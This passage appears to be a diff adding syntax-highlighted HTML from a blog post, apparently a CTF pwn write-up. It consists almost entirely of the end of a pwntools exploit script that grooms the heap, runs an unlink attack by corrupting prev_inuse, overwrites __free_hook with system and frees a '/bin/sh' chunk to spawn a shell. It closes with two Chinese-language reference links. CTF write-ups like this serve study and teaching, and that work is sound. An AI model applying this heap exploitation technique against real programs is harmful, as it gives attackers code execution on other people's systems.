+    <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x1f0</span><span class="p">)</span> <span class="c1">#0 ~ 6</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x1f0</span><span class="p">)</span> <span class="c1">#7</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x108</span><span class="p">)</span> <span class="c1">#8</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span> <span class="c1">#9</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x108</span><span class="p">)</span> <span class="c1">#10</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x108</span><span class="p">)</span> <span class="c1">#11</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="c1">#index 0 ~ 6</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
+
+<span class="n">edit</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x11</span><span class="s1">'</span><span class="o">*</span><span class="mh">0x108</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x11</span><span class="s1">'</span><span class="o">*</span><span class="mh">0x100</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x310</span><span class="p">))</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="o">*</span><span class="mh">0x1f8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x121</span><span class="p">))</span><span class="c1">#change prev_inuse</span>
+
+<span class="n">free</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> <span class="c1"># unlink attack</span>
+<span class="n">dbg</span><span class="p">()</span>
+
+<span class="c1"># free_hook -&gt; system</span>
+
+<span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__free_hook'</span><span class="p">]</span>
+<span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'system'</span><span class="p">]</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x300</span><span class="p">)</span> <span class="c1">#0</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="o">*</span><span class="mh">0x200</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span> <span class="o">-</span> <span class="mi">8</span><span class="p">))</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x108</span><span class="p">)</span> <span class="c1">#1</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x108</span><span class="p">)</span> <span class="c1">#2</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+<span class="n">dbg</span><span class="p">()</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'/bin/sh</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">inter</span><span class="p">()</span>
+</pre></div>
+<p>参考文章：</p>
+<p><a href="https://blog.csdn.net/prettyX/article/details/115559822" target="_blank">https://blog.csdn.net/prettyX/article/details/115559822</a></p>
+<p><a href="https://blog.csdn.net/qq_43409582/article/details/109825038" target="_blank">https://blog.csdn.net/qq_43409582/article/details/109825038</a></p>
+</div>
+</div>
